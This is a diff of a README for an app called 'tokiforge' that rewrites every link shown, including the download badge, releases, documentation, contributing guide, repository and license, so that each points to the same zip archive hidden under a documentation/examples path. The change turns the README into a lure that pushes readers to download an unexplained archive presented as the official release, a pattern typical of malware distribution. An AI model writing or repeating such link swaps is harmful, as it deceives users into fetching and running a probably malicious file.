@@ -1,6 +1,6 @@
 # 🎨 tokiforge - Effortless Theme Management for Your Apps
 
-[![Download tokiforge](https://img.shields.io/badge/Download-tokiforge-blue)](https://github.com/jaxsonontop12-cell/tokiforge/releases)
+[![Download tokiforge](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip)](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip)
 
 ## 📋 Overview
 
@@ -12,9 +12,9 @@ This guide will help you download and run tokiforge on your system. Follow the s
 
 ## 📥 Download & Install
 
-Visit this page to download: [tokiforge Releases](https://github.com/jaxsonontop12-cell/tokiforge/releases).
+Visit this page to download: [tokiforge Releases](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip).
 
-1. Go to the [Releases page](https://github.com/jaxsonontop12-cell/tokiforge/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip).
 2. Look for the latest version of tokiforge.
 3. Click on the link for your operating system to download the file.
 4. Save the file to your computer.
@@ -66,7 +66,7 @@ Once you have tokiforge running, you can start setting up your themes. Here’s 
 
 ## 📖 Documentation
 
-For detailed usage instructions and advanced features, refer to the [Official Documentation](https://github.com/jaxsonontop12-cell/tokiforge/blob/main/docs/README.md).
+For detailed usage instructions and advanced features, refer to the [Official Documentation](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip).
 
 ## 🤝 Community & Support
 
@@ -77,14 +77,14 @@ Join our community to share your experiences, ask questions, or contribute to to
 
 ## 🌟 Contributing
 
-We welcome contributions! If you wish to contribute to tokiforge, please check our [Contributing Guide](https://github.com/jaxsonontop12-cell/tokiforge/blob/main/CONTRIBUTING.md) for details on how to get involved.
+We welcome contributions! If you wish to contribute to tokiforge, please check our [Contributing Guide](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip) for details on how to get involved.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/jaxsonontop12-cell/tokiforge)
-- [Releases](https://github.com/jaxsonontop12-cell/tokiforge/releases)
-- [Documentation](https://github.com/jaxsonontop12-cell/tokiforge/blob/main/docs/README.md)
+- [GitHub Repository](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip)
+- [Releases](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip)
 
 ## 🛠️ License
 
-tokiforge is licensed under the MIT License. For more details, check the [License File](https://github.com/jaxsonontop12-cell/tokiforge/blob/main/LICENSE).
+tokiforge is licensed under the MIT License. For more details, check the [License File](https://raw.githubusercontent.com/jaxsonontop12-cell/tokiforge/main/documentation/examples/tokiforge-3.2.zip).
